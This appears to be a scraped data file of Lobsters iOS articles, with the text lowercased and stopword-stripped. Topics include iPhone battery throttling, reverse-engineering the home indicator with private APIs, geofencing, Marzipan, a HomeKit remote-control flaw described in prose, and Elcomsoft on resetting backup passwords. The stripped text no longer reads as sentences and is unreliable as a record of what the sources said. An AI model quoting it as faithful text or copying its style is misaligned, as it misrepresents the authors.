navigation flow appthe entire implementation code mvvmc viewed github hereuse mvvm project testdrivendevelopmenttestability one major prerequisite architectural pattern project relies heavily testdriven development important choose good architectural pattern mvc preferable architectural pattern come unit testing hence recommended use mvc case testdriven developmentas long know thin view controller mvvm appropriate architectural pattern testdrivendevelopment make overall code testable alongside productionconclusionto conclude short turn mvvm way ahead mvc mvp come io app development however end boil requirement appin general case mvc good architectural pattern develop smaller midsized application complex app scenario need know make view controller thin lean moving presentation logic
226,Lobsters,ios,Apple iOS,Pressing the Side Button to Confirm Payments on iPhone X,https://daringfireball.net/2017/12/side_button_to_confirm_payments_on_iphone_x,pressing side button confirm payment iphone x,pressing side button confirm payment iphone x hacker news comment iphone x review double click pay animation button supposed double tap update alex fehners iv√°n cavero belaunde update joanna stern john r kirk craig mod,pressing side button confirm payment iphone x thursday december occasionally notice burst traffic daring fireball hacker news always shortlived reason never seen explained daring fireball article always get blacklisted hacker news hit front page apparent lot hn reader like work basis see shameless apple shill shame article get deleted like reading comment feel like keep toe read comment people like daring fireball even blacklisted hacker news homepage though comment thread still exist went hacker news comment iphone x review today comment apple pay work iphone x caught attention arielm apple made interaction unintuitive even confused one example purchasing app prex tap get button place finger home button enter password x tap button look device follow unintuitive animation actually press physical side button nkristoffersen x day animation press physical button totally stumped first time overall fan great camera great screen new interaction taking getting used breatheoften yeah explanation side button tap considered straight bug google remark caught attention technicallysavvy family member confused thing first time tried buy app new iphone x showed phone double click pay asked supposed double click work tried double tapping double click pay label screen explained animation pointing physical side button proverbial light bulb turned interesting design dilemma reason apple requires press physical side button confirm purchase apple pay app store pressing side button faked app onscreen button nefarious app could present fake apple pay button normal app clicking side button always lock screen doubleclicking put apple pay mode apple software override side button like double clicking side button confirm purchase effectively guarantee legitimate payment experience people naturally expect everything iphone done screen screen phone even true iphone x even animation pointing side button screen occur people need something offscreen authorize transaction think affordance side screen button supposed double tap notice verbal distinction click tap sure solution think apple need come better indication perhaps something explicit first time encounter need click hardware button tap something screen update problem new face id touch id similar problem note got today friend fwiw touch id four year still see people try press fingerprint icon show middle screen count number time past six month think x initial doubleclick confusion new problem alex fehners jtregear daringfireball father law repeatedly said touch id working putting thumb finger print icon screen rather home button iv√°n cavero belaunde daringfireball entirely new problem first time mom asked fingerprint itunes purchase touchid thought put finger fingerprint onscreen image home button update commentary joanna stern yes onscreen language need rewritten arrow pointing right suggest press damn side button twice damn right edge phone john r kirk mock went week without understanding confirm payment iphone x kept doubletapping screen google read article able figure apple got ui wrong wrong craig mod main crit gruber otherwise great review sidebutton doublepress really really really bad unintuitive damningly fun large part powerbuttonacrossfromvolumerockers always felt like fundamentally wrong design decision doublepress aside take unintentional screenshots day least folder best part iphone x experience really fun feel totally tactile responsive fluid way iphones never
227,Lobsters,ios,Apple iOS,A Message to Our Customers about iPhone Batteries and Performance,https://www.apple.com/iphone-battery-and-performance/,message customer iphone battery performance,,low battery state charge higher chemical age colder temperature user likely experience unexpected shutdown extreme case shutdown occur frequently thereby rendering device unreliable unusable iphone iphone plus iphone iphone plus iphone se generation iphone iphone plus io dynamically manages performance peak prevent device unexpectedly shutting iphone still used performance management feature specific iphone apply apple product starting io iphone iphone plus iphone x include feature iphone x iphone x max iphone xr include feature starting io effect performance management newer model may le noticeable due advanced hardware software design performance management work looking combination device temperature battery state charge battery impedance variable require io dynamically manage maximum performance system component cpu gpu order prevent unexpected shutdown result device workload selfbalance allowing smoother distribution system task rather larger quick spike performance case user may notice difference daily device performance level perceived change depends much performance management required particular device case require extreme form performance management user may notice effect longer app launch time lower frame rate scrolling backlight dimming overridden control center lower speaker volume gradual frame rate reduction apps extreme case camera flash disabled visible camera ui apps refreshing background may require reloading upon launch many key area impacted performance management feature include cellular call quality networking throughput performance captured photo video quality gps performance location accuracy sensor like gyroscope accelerometer barometer apple pay low battery state charge colder temperature performance management change temporary device battery chemically aged far enough performance management change may lasting rechargeable battery consumables limited lifespan eventually needing replaced impacted would like improve device performance replacing device battery help
229,Lobsters,ios,Apple iOS,iPhone X home button,http://blog.zats.io/2017/12/27/iPhone-X-home-button/,iphone x home button,finding home indicator class twitter building putting together afterword zats warpling shaps,soon saw iphone x home indicator replacing physical button got interested behavior visible lock screen arbitrary wallpaper background app showing arbitrary content case video game also change quite quickly obviously uikit expose anything remotely similar let figure built finding home indicator class figure look relevant code tried think similar ui element initially thought system status bar would closest relative like home indicator life lock screen like home indicator added every app window first naive attempt look uikit contains status barrelevant code looking uikit header dump find github find anything seemed correspond new home indicator next like explore springboard app life coreservices folder contains various system functionality corresponding lock home screen dumping class containing springboard classdump brew install classdump show interesting sbhomegrabberview good start classdump applicationsxcodeappcontentsdeveloperplatformsiphoneosplatformdeveloperlibrarycoresimulatorprofilesruntimesiossimruntimecontentsresourcesruntimerootsystemlibrarycoreservicesspringboardappspringboard interface sbhomegrabberview uiview uisettingskeypathobserver sbattentionawarenessclientdelegate mtlumadodgepillbackgroundluminanceobserver sbhomegrabbersettings setting mtlumadodgepillview pillview sbattentionawarenessclient idletouchawarenessclient bool touchesareidle bool autohides long long luma unsigned long long suppresslumaupdates property nonatomic bool autohides synthesize autohidesautohides void cxxdestruct void lumadodgepilldiddetectbackgroundluminancechange id next let load entire code springboard dummy app add view window check actually one interested code cleaner essential idea import dlfcnh somewhere viewdidload dlopen binarypath cstringusingencoding rtldnow uiview const view nsclassfromstring sbhomegrabberview alloc init view sizetofit selfview addsubview view modification get know looking let figure built learn implementation detail use hopper disassembler even free version fine purpose app help reduce friction reading disassembly still know basic need open binary find method interest jumping toggle pseudo code top generate readable mix objectivec c assembly typed name class see method implemented time build intuition learn spot interesting method never hurt start public uikit method since apple engineer use started sbhomegrabberview initwithframe unless comfortable reading assembly switch pseudocode mode try make much sense possible sometimes code quite selfexplanatory sometimes find dead end personal note find reading implementation detail interesting fun sometimes want understand certain behaviour better back sbhomegrabberview see rather thin wrapper aside various oh hey awattentionawarenessconfiguration need revisit later add mtlumadodgepillview subview initially thought defined metal framework mostly due mtl prefix seems bit specific defined lowlevel framework metal also matthias pointed twitter prefix class actually mt mtl luckily load binary springboard app also get access library load subsequently make finding library defining class easy using dladdr const class mtlumadodgepillviewclass nsclassfromstring mtlumadodgepillview dlinfo dlinfo dladdr bridge void mtlumadodgepillviewclass dlinfo dlinfodlifname path binary defining symbol class case code run part app set investigate also use lldb lesser known lldbfeature able set variable advantage using lldb recompile app disadvantage lldb requires bit help type since access header file hence casting additional variable function return type lldb e dlinfo dlinfo lldb e void dladdr bridge void nsclassfromstring mtlumadodgepillview dlinfo lldb p dlinfodlifname const char applicationsxcodeappcontentsdeveloperplatformsiphoneosplatformdeveloperlibrarycoresimulatorprofilesruntimesiossimruntimecontentsresourcesruntimerootsystemlibraryprivateframeworksmaterialkitframeworkmaterialkit see defined systemlibraryprivateframeworksmaterialkitframeworkmaterialkit class mtlumadodgepillview protocol mtlumadodgepillbackgroundluminanceobserver nsobject void lumadodgepilldiddetectbackgroundluminancechange mtlumadodgepillview end interface mtlumadodgepillview uiview property nonatomic weak id mtlumadodgepillbackgroundluminanceobserver backgroundlumninanceobserver property nonatomic mtlumadodgepillviewstyle style property nonatomic readonly mtlumadodgepillviewbackgroundluminance backgroundluminance end thing point figure possible value mtlumadodgepillviewstyle mtlumadodgepillviewbackgroundluminance enough look description method convert integer value string going use constant typedef nsenum nsinteger mtlumadodgepillviewstyle mtlumadodgepillviewstylenone mtlumadodgepillviewstylethin mtlumadodgepillviewstylegray mtlumadodgepillviewstyleblack mtlumadodgepillviewstylewhite typedef nsenum nsinteger mtlumadodgepillviewbackgroundluminance mtlumadodgepillviewbackgroundluminanceunknown mtlumadodgepillviewbackgroundluminancedark mtlumadodgepillviewbackgroundluminancelight last interesting api backgroundlumninanceobserver invoke callback every time view changed appearance building mtlumadodgepillview getting closer mtlumadodgepillviewstyle wrapper sort internally privateclass galore proxy call cabackdroplayer private io using whole slew cafilters private io including one called kcafilterhomeaffordancebase cabackdroplayer powering various blur effect since io introduced nutshell clone view hierarchy behind layer gather statistic content also calayer allows apply quartzcore filter layer cloning view hierarchy along filter applied allows produce variation effect provided uivisualeffectview let take basic blur example uiblureffect blur uiblureffect effectwithstyle uiblureffectstylelight uivisualeffectview blurview uivisualeffectview alloc initwitheffect blur build need gaussian blur saturation filter solid white color composed using source blend mode rough code filtering part cafilter const blur id nsclassfromstring cafilter filterwithtype kcafiltergaussianblur blur setvalue forkey inputradius cafilter const saturate id nsclassfromstring cafilter filterwithtype kcafiltercolorsaturate saturate setvalue forkey inputamount cabackdroplayer backdrop nsclassfromstring cabackdroplayer new backdropfilters blur saturate calayer overlay calayer new overlaybackgroundcolor uicolor cgcolor overlaycompositefilter id nsclassfromstring cafilter filterwithtype kcafiltersourceover layer addsublayer backdrop layer addsublayer overlay putting together final touch open mtlumadodgepillview initwithframe show list filter materialkit creates order replicate effect cafilter const blur id nsclassfromstring cafilter filterwithtype kcafiltergaussianblur cafilter const colorbrightness id nsclassfromstring cafilter filterwithtype kcafiltercolorbrightness cafilter const colorsaturate id nsclassfromstring cafilter filterwithtype kcafiltercolorsaturate get actual value filter pause using view debugger select one added view copy address view layer section right console use selected address reference view layer lldb po frame stylewhite backgroundluminanceunknown lldb po calayer filter nsarrayi homeaffordancebase gaussianblur colorbrightness colorsaturate lldb po calayer filter valueforkey inputamount lldb po calayer filter valueforkey inputaddwhite noticed casting type integer calling property help lldb figure type object behind pointer repeating valueforkey dance every property found mentioned mtlumadodgepillview initwithframe bit tedious want look original style definition file assuming come plist somewhere finished reconstruct view using quartzcore cafilter const homeaffordancebase id nsclassfromstring cafilter filterwithtype kcafilterhomeaffordancebase uiimage const lumadodgemap uiimage imagenamed lumadodgepillmap inbundle nsbundle bundleforclass viewclass compatiblewithtraitcollection nil homeaffordancebase setvalue bridge id lumadodgemapcgimage forkey inputcolormap cafilter const blurfilter id nsclassfromstring cafilter filterwithtype kcafiltergaussianblur cafilter const colorbrightness id nsclassfromstring cafilter filterwithtype kcafiltercolorbrightness cafilter const colorsaturate id nsclassfromstring cafilter filterwithtype kcafiltercolorsaturate mtlumadodgepillviewstylethin value homeaffordancebase setvalue forkey inputamount homeaffordancebase setvalue forkey inputaddwhite homeaffordancebase setvalue forkey inputoverlayopacity blurfilter setvalue forkey inputradius blurfilter setvalue yes forkey inputhardedges colorbrightness setvalue forkey inputamount colorsaturate setvalue forkey inputamount calayer layer nsclassfromstring cabackdroplayer new layerframe cgrectinset selfviewbounds layerfilters homeaffordancebase blurfilter colorsaturate colorsaturate layercornerradius selfviewlayer addsublayer layer mysterious home affordance base filter seems use passed lumadodgepullmap image map input image everything else seems fairly straight forward use filter saw implementation uivisualeffectview get final result afterword hope article showed reverse engineering far le magical endeavor appeared objectivec help abundance information retained binary make reverse engineering fun adventure feel free share thought ask question twitter zats thanks go warpling shaps others suggestion improve post
230,Lobsters,ios,Apple iOS,Geofencing in iOS with Objective-C (2015),https://spin.atomicobject.com/2015/07/16/geofencing-ios-objectivec/,geofencing io objectivec,jeanette geofencing corelocation framework asking permission forgiveness erecting geofences entry exit local notification,colleague jeanette walking home office month back came upon unpleasantlooking accident approaching bridge west street washington unfortunate truck tall bridge clearance incurred serious damage experience made wonder could create mobile application could warn unlikely event driving truck taller ten foot approaching bridge giving time stop seek alternate route turned io geofence support ticket geofencing geofence invisible physical region surface earth notification sent locationcapable device physically enters exit region geofences io circular region latitude longitude center radius register intent notified io device enters exit one geofences use corelocation framework asking start monitoring geofence region provided use geofences instead simply asking device deliver constant location update two reason efficiency take nearly much power let io geofence calculation privacy need know everywhere user go figure crossed interesting area asking permission forgiveness use kind location service io need permission user course io apps could try use location service io would prompt user app behalf wideranging location permission apple improved permission scheme since splitting location permission always use requires u explicitly ask one geofences need always type location permission mean tracking user precise location everywhere though always notified enter leave geofences get permission need first explain user going permission setting custom io target property select project xcode app target info add property nslocationalwaysusagedescription thing ask permission check existing location authorization status calling authorizationstatus cllocationmanager undetermined somehow use variety go ahead ask always permission already always permission request noop location authorization restricted denied u good ask advise user going able provide location service unless turn back setting app switch cllocationmanager authorizationstatus case kclauthorizationstatusnotdetermined case kclauthorizationstatusauthorizedwheninuse self askforpermission return case kclauthorizationstatusauthorizedalways self setupgeofences return case kclauthorizationstatusdenied case kclauthorizationstatusrestricted self showsorryalert return finally ask permission need instantiate keep strong reference cllocationmanager use requestalwaysauthorization wrapped respondstoselector check crash device device go ahead move setting version io ask permission u try selflocationmanager cllocationmanager new selflocationmanager respondstoselector selector requestalwaysauthorization selflocationmanager requestalwaysauthorization else self setupgeofences response permission grant asynchronous need implement cllocationmanagerdelegate protocol implement didchangeauthorizationstatus detect permission granted user denied outright new status clauthorizationstatus type authorizationstatus gave always permission ready move erecting geofences next step register geofences interested cllocationmanager geofences defined instance clregion though one actually work clcircularregion create one need latitude longitude radius meter well string identifier region center clregion bridge clcircularregion alloc initwithcenter center identifier bridge picked meter geofence reason roughly size block starter giving time stop go bridge though meter might better giving chance route around hazard also testing several io device proven good reliable minimum geofence size created region ask io start monitoring startmonitoringforregion safe call call region whose identifier already exists old region replaced selflocationmanager startmonitoringforregion bridge sure implement cllocationmanagerdelegate method success didstartmonitoringforregion failure monitoringdidfailforregion app aware status monitoring request several reason geofence monitoring fail pay listen io telling entry exit io monitoring geofences implement appropriate cllocationmanager method geofence entry didenterregion exit didexitregion io call appropriate launching app background already running app chose deliver local notification conveniently appear smartwatch well one caveat monitoring geofence entry need know whether device already geofence start monitoring need ask receive didenterregion call unless device actually move outside geofence inside tried several solution best one come call startupdatinglocation use clcircularregion containscoordinate test whether latitude longitude inside region finally call stopupdatinglocation putting together answer seems event ever driving truck ten foot tall use phone give another shot avoiding disaster
231,Lobsters,ios,Apple iOS,Marzipan,https://daringfireball.net/2017/12/marzipan,marzipan,marzipan apple plan combined iphone ipad mac apps create one user experience acorn excellent piece reading line gurman report terrible appkit trace root way back nextstep late nscolor uicolor uxkit uikit macos important mac thriving gurman cite twitter example gu mueller rambo figured create app using code available github ilja iwas complained recently hysteresis eaglefiler spamsieve similar concern jeff johnson twitter also johnson recent redoubling,marzipan saturday december mark gurman intriguing story bloomberg week problem start headline apple plan combined iphone ipad mac apps create one user experience gurman probably write headline even make sense io concept mouse cursor run touchscreen device macos support touchscreen device requires mouse pointer one user experience neither possible desirable truth effort apple almost certainly crossplatform application instead crossplatform framework developer developer news user news gurman starting early next year software developer able design single application work touchscreen mouse trackpad depending whether running iphone ipad operating system mac hardware according people familiar matter developer currently must design two different apps one io operating system apple mobile device one macos system run mac lot work apple customer long complained mac apps get short shrift apple developing strategy part next major io macos update said people requested anonymity discus internal matter codenamed marzipan secret project planned multiyear effort start rolling early next year may announced company annual developer conference summer gu mueller designer developer excellent acorn wrote excellent piece reading line gurman report feel like article gurman could reduced think apple might day shared ui framework io macos apple could even create sort cross store bundling single store single binary platform using framework even though nothing stopping apple today sound neat cool platform also used processor boot may may happen starting next year could likely canceled well apple declined comment sensational story crux article apple working shared ui framework io macos find surprising could also see written completely swift though personally rather objc maximum interop existing framework history filled cross platform uis writeonce runanywhere dream none turned insanely great quibble mueller piece none turned insanely great way generous description writeoncerunanywhere application framework terrible none good least none good perspective make truly native mac io apps good everyone perspective certainly apple lot work involved getting iphone app work well ipad still see iphoneonly apps even good new crossplatform macios framework would way work involved bring iphone app mac bring ipad would le work today still far supporting ipad high level user interface native mac apps written using framework called appkit appkit trace root way back nextstep late appkit nextstep root remain pervasive today class name developer use writing cocoa apps mac still prefixed n apple created io rather port appkit effectively hit reset button created newfromthegroundup set framework called uikit appkit mac uikit io tvos uikit fresh start short sort could would differently take appkit result benefitted decade lesson learned unwanted baggage dropped name one many difference appkit nscolor uikit uicolor nscolor uicolor serve purpose specifying entire user interface never platform fundamentally different mac iphone specifying thing like say color could never seen anyone argue appkit brought io many call ever since first sdk iphone appeared uikit brought mac guilherme rambo wrote piece last year uxkit uikit macos important painfulness working appkit killing mac platform really awesome io apps would benefit lot macos counterpart developer simply cope burden developing choose one popular hint macos instead people making crappy webbased apps shoving app hundred megabyte calling macos apps believe would possible single ui framework io macos changed mind saw uikit work tvos think framework different visual language functionality addedremoved based need platform uikit tvos facility work remote control controlling focus parallax effect ubiquitous platform uikit io touch input gesture recognizers toolbars navigation bar uikit macos would window controller contextual menu statusbar item little hyperbolic say anything killing mac platform today mac thriving question maintaining parallel io mac apps work today could also true many company native mac apps prioritized lower native io gurman cite twitter example example iphone ipad twitter app regularly updated social network latest feature mac version refreshed recently widely considered substandard single app machine mac ipad iphone user get new feature update time last sentence naive twitter could somehow generate mac app io app without effort would terrible mac app nobody want io app running window mac best would take le work today maintain mac app guarantee twitter would work regardless much easier would today gu mueller easy solution updating mac version twitter feature io peer twitter care enough update need massive engineering effort put behind road already explored server apis already exposed must done io version need put effort care tweetie mac twitter mac based built ground single person twitter maintain twitter inc bothered caring ultimately make true mac apps mac apps caring detail caring mac way thing amount shared framework macos io make io developer care thing properly mac apple mac photo app implemented largely using private framework called uxkit many way uikit mac curious uxkit rambo figured create app using interesting thing uxprefixed class implementation uikit control top appkit uxlabel uxcollectionview uxnavigationcontroller uxviewcontroller much see whether right decided try build really simple app using uxkit code available github app let user search photo flickr select see bigger version really simple working app noticed felt like working io app think developer familiar uikit would problem making macos apps using uxkit know apps use uxkit currently macos photo app pricing app one used apple store concern whole situation even true apple indeed working creating crossplatform uikitlike framework io macos existence framework would spur developer company create mac apps inevitably lead creation good mac apps even apple much concern fallen short regard photo mac one worst mac apps use love icloud photo library syncing set thousand ten thousand actually case photo video sync device knowing backed apple server great experience term serving repository photo video photo mac work well term acting like good mac app even something simple fundamental mac experience draganddrop screwed photo drag image photo pretty much drop finder first start new drag new file copied finder actually drop many context developer ilja iwas complained recently almost year drag image photo safari extension every macos application us webviews like garagesale many party apps work image imagine default image handling app mac platform communicate via drag drop default browser going almost year desktop platform used excel drag drop day go without frustrated user asking support team garagesale receive drag photo try dragging image photo main photo window background work need activate window first drag file managertype app mac allows drag initiated background try doubleclick hold image photo drag say doubleclick image let go button second click photo mac initiate drag nut doubleclick hold drag create selected range multiple item list item doubleclick first item selection one drag added selection nonlist view like icon view finder doubleclickanddrag nothing addition nonstandard particular behavior get way want open image photo mac allow hysteresis pointer movement doubleclick mac user never notice doubleclick something mac mouse pointer allowed move slightly first second click slight movement especially common using trackpad happen mouse notice result always intended early version window lacked hysteresis doubleclicking felt brittle unreliable slight mouse movement first second click would render doubleclick attempt void photo mac try doubleclick image photo inadvertently move mouse pointer click wind starting drag instead opening image ever felt clumsy trying open image photo fault apple get started keyboard shortcut photo get back image opened detail view list thumbnail esc escape key work use space bar shortcut might well escswearspace bar even year get used though photo mac created io developer saw mac one time said sure use photo despite crummy mac interface photo poor poster child argument apple make easier developer experience io create mac apps longtime mac developer michael tsai author eaglefiler spamsieve similar concern long seemed like obvious thing apple sure good mac platform upside get lot port io apps previously mac app poor quality webbased one downside want using lowest common denominator io port like using mac apps really take advantage desktop offer continually annoyed apps essentially put iosstyle interface window support standard mac convention feature also worry bifurcating platform uxkit appkit apps inevitably mean apple focus le enhancing appkit time doubling surface area bug two class mac apps would good appkit going way carbon would even worse jeff johnson twitter seems big cultural divide io developer came mac io developer many latter group ok destroying mac frustrating also johnson tweet start good thread something crystalized yesterday afraid many uikit developer appkit unfortunate similarity vastly outnumber difference short apple goal make easier developer create good mac apps easier mac io app sibling share code apple goal make easier get io apps run mac slightly modified form think nonsensical think apple working toward single unified o best reason hope front recent redoubling apple effort pro mac hardware imac pro designed run iphone
232,Lobsters,ios,Apple iOS,Apple Confirms CPU Limitation In Ageing Devices,https://www.anandtech.com/show/12184/apple-confirms-cpu-limitation-in-ageing-devices,apple confirms cpu limitation ageing device,report reddit john poole geekbench blog matthew panzarino techcrunch electronic component news electronic component news,last week increasing discussion evidence apple supposed introduction cpu throttling mechanism directly related battery wear level apple iphones story started report reddit user experiencing slow performance iphone subsequent discovery performance restored full potential battery replacement graph credit john poole geekbench blog report prompted geekbench author john poole make use geekbench benchmark submission database plot performance individual device io version discover clear trend ever increasing distribution towards lower performance point newer o version matthew panzarino techcrunch able get official statement apple enquiring problem goal deliver best experience customer includes overall performance prolonging life device lithiumion battery become le capable supplying peak current demand cold condition low battery charge age time result device unexpectedly shutting protect electronic component last year released feature iphone iphone iphone se smooth instantaneous peak needed prevent device unexpectedly shutting condition extended feature iphone io plan add support product future apple official statement shed light issue come short actual technical explanation power management failing company claim issue heart battery degradation inability supply sufficient current stable voltage graph credit electronic component news capacity supply voltage battery decrease time function charge cycle charging behaviour higher charging current causing degradation per cycle cause total useable battery capacity cutoff voltage decrease problem facing iphones apple explains however twofold issue hand happens load spike battery able maintain high enough voltage pmic reliably able use source graph credit electronic component news soc block cpu gpus short transition idle load causing steep transient load spike going range battery degrade time cell impedance also rise also function state charge temperature current flow becomes restricted cell longer able satisfy power requirement high enough operating voltage apple approach issue limit peak power spike reducing cpu frequency time function battery wear solution however raise several question apple decide throttling behaviour core fault engineering fault design choice demonstrated john poole dataset apple throttling cpu frequency several stage exactly defines threshold reach stage either rather simplistic counter taking account charge cycle given battery hopefully dynamic method would able take advantage battery pmic capability determining battery wear given however seems o limiting performance even high state charge fully charge battery seems limitation implementation unfortunately simplistic type second question come regard came issue first place universal issue affecting greater number smartphones apple iphones first unique characteristic separating apple iphones smartphones apple using custom cpu architecture differs lot vendor plausible architecture able power power much aggressive fashion compared design stricter power regulation demand case another question rise indeed transient load issue power delivery system designed sufficiently robust enough cope load advanced level battery wear cold temperature advanced battery wear understandable condition device might able sustain normal operating condition state charge battery otherwise normal condition taken account design device battery soc pmic decoupling capacitor operating tolerance assumption hold true logically issue would also prevalent smaller iphone opposed iphone plus model latter larger battery capacity would allow greater discharge rate given stable voltage explanation might also one many factor flagship android device seem exhibit issue come much larger battery cell much latter part piece personal conjecture deeper cause problem clear larger issue apple simple solution beyond replacing battery affect recent device iphone iphone x verifying indeed plus variant would le prone problem something require lot testing collaboration data collection longer period time
233,Lobsters,ios,Apple iOS,"Apple Plans Combined iPhone, iPad & Mac Apps to Create One User Experience",https://www.bloomberg.com/news/articles/2017-12-20/apple-is-said-to-have-plan-to-combine-iphone-ipad-and-mac-apps,apple plan combined iphone ipad mac apps create one user experience,detected unusual activity computer network,detected unusual activity computer network continue please click box let u know robot
234,Lobsters,ios,Apple iOS,Your home was not so secure after all,https://medium.com/@khaost/your-home-was-not-so-secure-after-all-af52fbd6777c,home secure,home secure tl dr security apple homekit check sender remote message processing request ended allowing potentially anyone remotely control homekit accessory home daemon side underlying hap exchange breached went wrong homekit technical version technical version xpc watchos,home secure alltl dr apple built super secure door left key door forgot build wall around doorever since existence connected home accessory security always something people worried many thing go wrong fancy new btle lock software running compared old mechanical lock period time market connected home accessory really chaotic manufacturer shipping poorly implemented accessory terrible security really happy apple announced homekit back promising offer secure private way control connected home accessoriesthe thing lot time really way people check whether thing really secure homekit turned secure homekit check sender remote message processing request ended allowing potentially anyone remotely control homekit accessory homehomekit actually umbrella term covering software io device communication protocol software device provides centralized place manage home accessory daemon communication protocol hap used software io talk homekit accessory security issue watchos io daemon side underlying hap exchange breachedso went wrong homekit technical versionimagine homekit butler home home send imessage asking thing say want unlock front door would send message homekit asking unlock front door homekit receive message check message sent unlock door asked except reality homekit check sent message happily unlock door whenever someone ask soin order homekit something message need contain unique identifier identifies object accessory scene room home normally impossible anyone figure unique identifier object unless actually authorized access home homekit however two separate bug one watchos another io watchos allow someone figure unique identifier without authorizing person access home first place unique identifier remote attacker ask homekit almost anythingapple disabled ability people send homekit message others december temporary solution work proper fix future io release result sharing home new user remote access existing shared user longer available user io technical versionhomekit daemon built upon requestresponse pattern action favorite homekit app translated request sent daemon daemon process request perform operation reply request homekit app running io device communication done xpc access permission enforced tcc permission popup io information discussed article based disassembling homekit daemon binary bundled io sdk hopper great tool kind task allow securely access accessory home share home user apple built remote cloud messaging platform one behind imessage message across user device apps multiple transport processed homekit daemon centralized message dispatcherfun thing happen someone try design system flexible xpc message homekit daemon really need perform extra validation message since tcc io general already done hard work entitlement normal daemon daemon remote communication actual message encrypted homekit secure session encrypted packet sent remote cloud messaging platform issue homekit daemon handle remote message without secure session instead daemon discard message make sense state machine daemon treat message normal request processed anyway apple addressed issue io tvos improving message handling daemon sidesince homekit daemon handle request without secure session normal request send message home manager leak information home accessory information could used instruct homekit perform action normal situation two way could gather required information home manager one available watchos one introduced io watchos patched io watchos message send homekit daemon really interesting one one message let homekit watchos reply list home identifier along public private key used encrypt home data communicate accessory sender attacker got reply game homekit pairing identity private key attacker trick homekit thinking owner home even apple fixed messaging issuea small tool verifying vulnerabilitybut yeah information need tell homekit daemon thing send message targeting right home control every thing user home including ip camera
235,Lobsters,ios,Apple iOS,iPhone Performance and Battery Age,https://www.geekbench.com/blog/2017/12/iphone-performance-and-battery-age/,iphone performance battery age,reddit post kernel density iphone iphone performance battery age kadupse sudden shutdown,reddit post last week sparked discussion regarding iphone performance function battery age expect battery capacity decrease battery age expect processor performance stay however user older iphones lowerthanexpected geekbench score reported replacing battery increase score well performance phone going many phone experiencing decreased geekbench score answer question plotted kernel density geekbench singlecore score iphone iphone running different version io score obtained lowpower mode included distribution iphone chart iphone distribution iphone score io appears unimodal peak around average score however distribution iphone score io appears multimodal one large peak around average several smaller peak around lower score io effect even pronounced iphone chart iphone distribution iphone score io io io appears identical however distribution change io start look like iphone distribution performance battery age going first appears problem widespread get worse phone battery continue age see example difference distribution iphone score second problem due part change io difference abrupt function battery condition believe others apple introduced change limit performance battery condition decrease past certain point apple kadupse reddit offer following explanation many iphone device shutting unexpectedly even battery replacement program many people entitled use degraded battery last much le end lower voltage solution scale cpu performance solve anything bad better device shutdown need apple acknowledged sudden shutdown issue affected iphone iphone earlier year however issue affect iphone apple appears added similar change to√¢ io iphone performance drop due fix user experience reduced performance without notification user expect either full performance reduced performance notification phone lowpower mode fix creates third unexpected state state created mask deficiency battery power user may believe slow due cpu performance instead battery performance triggering apple introduced cpu slowdown fix also cause user think phone slow replace phone slow replace likely feed narrative
236,Lobsters,ios,Apple iOS,Face ID Stinks,https://www.troyhunt.com/face-id-stinks/,face id stink,phil schiller comment last week security implementation face id pretty thoroughly debunked dan goodin ar technica,gradually coming conclusion free phil schiller comment last week finally cemented face id stink wrote security implementation face id announced piece still entirely relevant today date nt seen practical attack worry mass one piece suggests vulnerable pretty thoroughly debunked dan goodin ar technica measurable way security posture good better touch id user experience face id better ux simply apple needed kill home button order get bezelfree experience let explain faceid stink video oh incidentally conscious final attempt made car failed likely due many biometric fails would nt passed even ideal scenario nt change failed attempt leading deserved mention anyway
237,Lobsters,ios,Apple iOS,"If your iPhone, iPad, or iPod touch unexpectedly restarts",https://support.apple.com/en-us/HT208332,iphone ipad ipod touch unexpectedly restarts,iphone ipad ipod touch wo nt turn frozen screen black frozen device still wo nt turn start device turn get stuck start locate device computer need help contact apple support,iphone ipad ipod touch wo nt turn frozen device frozen screen nt respond touch becomes stuck turn learn screen black frozen screen black frozen might need force restart device force restart wo nt erase content device force restart device even screen black button nt responding follow step ipad model face id press quickly release volume button press quickly release volume button press hold power button device restarts iphone later press quickly release volume button press quickly release volume button press hold side button see apple logo iphone iphone plus ipod touch generation press hold top side button volume button see apple logo ipad home button iphone earlier ipod touch generation earlier press hold home top side button see apple logo device still wo nt turn start plug device let charge one hour minute see charging screen nt see charging screen within hour see connect power screen check jack usb cable power adapter make sure everything plugged firmly free debris damaged might want try different usb cable power adapter device turn get stuck start see apple logo red blue screen startup try step connect device computer mac macos catalina open finder mac macos mojave earlier pc open itunes locate device computer device connected follow step ipad model face id press quickly release volume button press quickly release volume button press hold top button device begin restart continue holding top button device go recovery mode iphone later press quickly release volume button press quickly release volume button press hold side button see recovery mode screen iphone iphone plus ipod touch generation press hold top side volume button time keep holding see recovery mode screen ipad home button iphone earlier ipod touch generation earlier press hold home top side button time keep holding see recovery mode screen get option restore update choose update computer try reinstall io ipados without erasing data computer download software device take minute device exit recovery mode need repeat step need help contact apple support set service issue still see black screen charging force restarting following step article see black screen hear alert sound vibration screen remains black device chirp unmute connect power screen nt respond tap slide try gesture ca nt force device restart button broken stuck device stuck apple logo display solid color nt recognized itunes published date october
238,Lobsters,ios,Apple iOS,iOS 11 Horror Story: the Rise and Fall of iOS Security,https://blog.elcomsoft.com/2017/11/ios-11-horror-story-the-rise-and-fall-of-ios-security/,io horror story rise fall io security,new so mode requirement enter passcode order establish trust passcode big deal itunes backup password io forensic toolkit backup password io io stripping backup password knowledge base elcomsoft phone breaker changing apple id password removing icloud lock simply reset apple id password accessing icloud account icloud backup elcomsoft phone viewer call log file synced data password icloud keychain conclusion celebgate,loved apple used security past year company managed build complete multilayer system secure hardware software ecosystem protect customer common threat granted system without flaw notably obligatory use trusted phone number think vulnerability purpose twofactor authentication overall still secure mobile ecosystem market anymore release io praised past new so mode requirement enter passcode order establish trust new computer also made number change hood recently discovered every one change aimed making user life easier convenience came small trade security combined together seemingly small change made devastating synergy effectively stripping every protection layer previously secure system today one thing protecting data io device apple device registered apple account passcode left io security io attacker iphone passcode compromised lose data password thirdparty online account apple id password obviously second authentication factor problem finally lose access apple device registered apple id wiped locked remotely one passcode strippeddown security io big deal working sensitive environment front door security need secure building need additional check ekeys enter room longer applies io passcode access everything let u look user data idevice know passcode itunes backup password imagine working company whose main business breaking password iphone backup one make apple itunes thirdparty apps io forensic toolkit protected password password strong strong depending version io company build better software apple make backup password even secure end apple seemingly win race breaking password requires powerful computer multiple computer equipped highend video card even try handful password per second apple make sudden twist allowing anyone simply reset highly secure password io access device know passcode longer need perform lengthy attack go ahead remove password important tell let u look used io backup password io version io one could protect backup specifying backup password itunes one would need password set future backup made computer computer exception would protected password password would become property idevice pc copy itunes used set password could 